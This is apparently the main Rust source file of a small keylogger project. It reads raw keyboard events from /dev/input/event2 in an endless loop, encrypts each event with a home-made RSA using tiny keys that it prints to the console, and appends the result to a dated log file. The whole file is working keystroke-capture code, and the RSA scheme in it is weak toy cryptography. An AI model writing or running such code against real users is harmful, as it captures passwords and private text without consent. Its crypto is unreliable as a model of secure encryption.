mod keylogger;
mod rsa;

use keylogger::KeyLogger;
use rsa::{gen_keys, array_mod_pow, convert_to_u64, convert_to_u8};

use chrono::{DateTime, Local};
use std::path::Path;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::prelude::*;

fn main() {
	let (e, d, n) = gen_keys(10000, 50000);

	println!("e : {}", e);
	println!("d : {}", d);
	println!("n : {}", n);
  
	let mut test = KeyLogger::new("/dev/input/event2");

	let current_local: DateTime<Local> = Local::now();
	let custom_format = current_local.format("%Y-%m-%d");

	let logs_file_url = format!("./src/data/logs/{}.log", custom_format);

	if !Path::new(logs_file_url.as_str()).exists() {
		File::create(logs_file_url.as_str())
			.expect("Error while creating the file");
	}

	let mut logs_file = OpenOptions::new()
		.append(true)
		.open(logs_file_url.as_str())
		.expect("Error while opening the file");

	loop {
		let event = &mut test.get_current_event();
		let event_as_u64 = convert_to_u64(event.to_vec());
		let cypher = array_mod_pow(event_as_u64, e, n);
		let buffer = convert_to_u8(cypher);

		let _ = logs_file.write_all(&buffer);
	}
}
